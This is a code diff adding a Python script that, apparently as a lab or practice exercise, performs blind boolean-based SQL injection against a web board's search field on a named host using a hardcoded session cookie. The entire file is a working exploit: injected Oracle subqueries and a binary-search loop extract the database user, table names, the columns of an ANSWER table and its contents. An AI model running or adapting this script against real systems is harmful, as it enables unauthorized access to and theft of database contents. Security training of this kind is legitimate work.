@@ -1,0 +1,135 @@
+import requests
+
+URL = "http://elms1.skinfosec.co.kr:8082/community6/free"
+
+data = {
+    'startDt' : '',
+    'endDt' : '',
+    'searchType' : 'all',
+    'keyword' : ''
+}
+
+cookies = {'JSESSIONID': '4A31DD0AB25287A80ECA4EF7C40A25FD'}
+headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+
+query = {
+    "DB_user_len" : "CCC%' and (select length(user) from dual) = {} and '1%'= '1",
+    "DB_user_name" : "CCC%' and (select ascii(substr(user, {}, 1)) from dual) > {} and '1%'='1",
+    "table_count" : "CCC%' and (select count(table_name)from user_tables) = {} and '1%'='1",
+    "table_len" : "CCC%' and (select length(table_name)from (select table_name,rownum as rnum \
+        from user_tables) where rnum={}) > {} and '1%'='1",
+    "table_name" : "CCC%' and ascii(substr((select table_name from (select rownum as rnum, table_name \
+        from user_tables) where rnum={}),{},1))>{} and '1%'='1",
+    "answer_col_count" : "CCC%' and (select count(column_name) from all_tab_columns \
+        where table_name = 'ANSWER') = {} and '1%' = '1",
+    "answer_col_len" : "CCC%' and (select length(column_name) from (select column_name, rownum as rnum \
+        from all_tab_columns where table_name = 'ANSWER') where rnum = {}) > {}  and '1%' = '1",
+    "answer_col_name" : "CCC%' and (sel`ect ascii(substr(column_name, {}, 1)) from \
+        (select column_name, rownum as rnum from all_tab_columns where table_name = 'ANSWER') \
+            where rnum = {}) > {} and '1%'='1",
+    "data_count" : "CCC%' and (select count(ANSWER) from ANSWER) = {} and '1%'='1",
+    "data_len" : "CCC%' and (select length(ANSWER) from ANSWER) = {} and '1%'='1",
+    "data_name" : "CCC%' and (select ascii(substr(ANSWER, {}, 1)) from ANSWER) > {} and '1%'='1"
+}
+
+table1_name = [] # 테이블 이름 전체를 저장하기 위한 리스트
+
+class answer_table : # 개수, 이름(데이터) 길이, 이름(데이터) 구하는 클래스
+    def __init__(self) :
+        self.num = 0 # 개수를 저장하기 위해 선언
+        self.rnum = 0 # 우선순위를 저장하기 위해 선언
+        self.len = 0 # 이름 길이를 저장하기 위해 선언
+        self.t = 0 # table_len_count의 인덱스 
+        self.table_len_count = [] # 테이블 이름 길이 저장 리스트
+
+    def col_count(self,key) : # 개수 구하는 함수
+        for n in range(0,100) :
+            data["keyword"] = query[key].format(n)
+            res = requests.post(URL, data=data, headers=headers, cookies=cookies)
+            if 'CCCC' in res.text :
+                self.num = n
+                return n
+                       
+    def col_len(self,key) : # 이름 길이 구하는 함수
+        if key == 'answer_col_len' : # ANSWER 테이블의 칼럼 이름 길이를 구하는 if문
+            for c_seq in range(1,self.num+1) : 
+                self.rnum = c_seq
+                for n in range(0,100) :
+                    data["keyword"] = query[key].format(c_seq, n)
+                    res = requests.post(URL, data=data, headers=headers, cookies=cookies)
+                    if 'CCCC' not in res.text :
+                        self.len = n
+                        return n
+                    
+        elif key == 'table_len' : # 모든 테이블의 이름 길이를 구하는 함수
+            for a in range(1, self.num+1) :
+                self.rnum = a
+                for n in range(0,100) :
+                    data["keyword"] = query[key].format(a, n)
+                    res = requests.post(URL, data=data, headers=headers, cookies=cookies)
+                    if 'CCCC' not in res.text :
+                        self.table_len_count.append(n)
+                        break
+        else : # 데이터의 값 길이를 구하는 함수
+            for l in range(1,10) :
+                data["keyword"] = query[key].format(l)
+                res = requests.post(URL, data=data, headers=headers, cookies=cookies)
+                if 'CCCC' in res.text :
+                    self.len = l
+                    return l
+
+    def col_name(self, key) : # 이름을 구하는 함수
+        answer = ''
+        # 테이블 이름 길이들을 리스트에 넣어둬서 리스트에서 값을 뽑아오기위한 if문
+        if key == 'table_name' :
+            self.len = self.table_len_count[self.t]
+            self.t += 1
+        for i in range(1, self.len+1) :
+            ascii_min = 1
+            ascii_max = 127
+            while ascii_min < ascii_max:
+                avg = int((ascii_min + ascii_max) / 2)
+                if key == "answer_col_name" : data["keyword"] = query[key].format(i, self.rnum, avg)
+                elif key == 'table_name' : data["keyword"] = query[key].format(self.rnum, i, avg)
+                else : data["keyword"] = query[key].format(i, avg)
+                res = requests.post(URL, data=data, headers=headers, cookies=cookies)                
+                if 'CCCC' in res.text : ascii_min = avg + 1
+                else : ascii_max = avg
+            answer += chr(ascii_min)
+        return answer
+
+col = answer_table() # 클래스 객체 선언
+
+def name_al (key) : # 이름을 여러개 구하고 거기서 구하고자 하는 것을 구하기 위한 함수
+    name_a =''
+    col.rnum = 1
+    if key == 'table_name' : # 테이블 이름들은 전부 구해야하기 때문에 따로 if문 만듬
+        while col.rnum != len(col.table_len_count)+1 :
+            for a in range(1, col.num+1) :
+                table1_name.append(col.col_name(key))
+                col.rnum += 1
+    else :
+        while True :
+                name_a = col.col_name(key)
+                if name_a == 'INF6' or name_a == 'ANSWER' or name_a == 'ant6': return(name_a) 
+                else : 
+                    col.num += 1
+                    name_a = col.col_name(key)
+        
+for key in query : # query문을 차례로 뽑아내기 위한 for문
+    if key == 'DB_user_len' : print("DB 이름 길이 : ",col.col_len(key))
+    elif key == 'DB_user_name' : print("DB 이름 : ",name_al(key))
+    elif key == 'table_count' : print("테이블 개수 : ",col.col_count(key))
+    elif key == 'table_len' : 
+        col.col_len(key)
+        print("테이블 이름 길이 : ",col.table_len_count)
+    elif key == 'table_name' :
+        name_al(key)
+        print("테이블 이름 전체 : ", table1_name)
+    elif key == 'answer_col_count' : print("테이블 개수 : ",col.col_count(key))
+    elif key == 'answer_col_len' : print("테이블 길이 : ",col.col_len(key))
+    elif key == 'answer_col_name' : 
+        if 'ANSWER' in table1_name : print('테이블 이름 : ANSWER')
+    elif key == 'data_count' : print("data 개수 : ",col.col_count(key))
+    elif key == 'data_len' : print("data 길이 : ",col.col_len(key))
+    elif key == 'data_name' : print("data 값 : ",name_al(key))
